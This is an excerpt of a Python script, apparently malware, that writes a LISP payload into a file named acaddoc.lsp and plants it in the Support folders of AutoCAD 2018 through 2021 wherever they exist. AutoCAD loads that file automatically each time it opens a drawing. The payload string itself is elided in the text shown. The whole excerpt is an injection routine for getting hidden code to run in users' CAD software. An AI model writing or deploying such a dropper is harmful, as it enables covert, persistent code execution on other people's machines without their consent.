...
def code_injector():
   ...
   f = open("acaddoc.lsp", "w+")
   f.write(lispcode)    
   f.close()
   
if os.path.exists(os.environ['PROGRAMFILES'] + "//Autodesk//Autocad 2021//Support"):    
	os.chdir(os.environ['PROGRAMFILES'] + "//Autodesk//Autocad 2021//Support")
	code_injector()
	
if os.path.exists(os.environ['PROGRAMFILES'] + "//Autodesk//Autocad 2020//Support"):    
	os.chdir(os.environ['PROGRAMFILES'] + "//Autodesk//Autocad 2020//Support")
	code_injector()
	
if os.path.exists(os.environ['PROGRAMFILES'] + "//Autodesk//Autocad 2019//Support"):    
	os.chdir(os.environ['PROGRAMFILES'] + "//Autodesk//Autocad 2019//Support")
	code_injector()
	
if os.path.exists(os.environ['PROGRAMFILES'] + "//Autodesk//Autocad 2018//Support"):    
	os.chdir(os.environ['PROGRAMFILES'] + "//Autodesk//Autocad 2018//Support")
	code_injector()